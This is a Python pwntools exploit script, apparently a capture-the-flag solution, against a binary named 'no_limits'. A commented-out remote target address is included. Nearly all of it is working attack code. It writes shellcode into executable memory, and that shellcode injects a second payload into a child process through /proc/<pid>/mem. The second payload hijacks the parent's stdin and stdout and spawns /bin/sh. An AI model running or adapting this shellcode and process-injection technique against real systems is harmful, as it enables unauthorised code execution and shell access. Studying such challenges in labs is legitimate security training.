#!/usr/bin/env python3
from pwn import *
from time import sleep

context.binary = binary = ELF('./no_limits', checksec=False)

def get_child_pid():
    p.sendlineafter(b'Exit\n', b'2')
    p.recvuntil(b'= ')
    return int(p.recvline().strip())

def write_exec_mem(shellcode):
    p.sendlineafter(b'Exit\n', b'1')
    p.sendlineafter(b'?\n', str(len(shellcode)).encode())
    p.sendlineafter(b'?\n', b'7')
    p.sendlineafter(b'?\n', shellcode)

    p.recvuntil(b'at ')
    return int(p.recvline().strip(), 16)

def execute_code(shellcode_addr):
    p.sendlineafter(b'Exit\n', b'3')
    p.sendlineafter(b'?\n', hex(shellcode_addr).encode())

p = process()
#p = remote('10.1.210.142', 9999)

child_pid = get_child_pid()
parent_pid = child_pid - 1
info(f'child pid: {child_pid}')
info(f'parent pid: {parent_pid}')

child_shellcode = (b'\x90'*0x100)+asm(f'''
    lea rdi, [rip+parent_stdin]
    mov esi, 0x2
    mov eax, 0x2
    syscall

    mov edi, eax
    xor esi, esi
    mov eax, 0x20
    syscall

    lea rdi, [rip+parent_stdout]
    mov esi, 0x2
    mov eax, 0x2
    syscall

    mov edi, eax
    mov esi, 1
    mov eax, 0x20
    syscall

    lea rdi, [rip+binsh]
    xor esi, esi
    xor edx, edx
    mov eax, 0x3b
    syscall

    parent_stdout:
    .string "/proc/{parent_pid}/fd/1"

    parent_stdin:
    .string "/proc/{parent_pid}/fd/0"

    binsh:
    .string "/bin/sh"

''')

parent_shellcode = asm(f'''
    lea rdi, [rip+child_mem]
    mov esi, 0x2
    mov eax, 0x2
    syscall

    mov edi, eax
    mov esi, 0x40183a
    xor edx, edx
    mov eax, 0x8
    syscall

    lea rsi, [rip+child_shellcode]
    mov edx, {len(child_shellcode)}
    mov eax, 0x1
    syscall

    l:
    jmp l

    child_mem:
    .string "/proc/{child_pid}/mem"

    child_shellcode:
''') + child_shellcode


assert b'\x0a' not in parent_shellcode

shellcode_addr = write_exec_mem(parent_shellcode)
info(f'shellcode written at: {hex(shellcode_addr)}')

execute_code(shellcode_addr)

info('waiting for shell...')
sleep(5)
p.interactive()
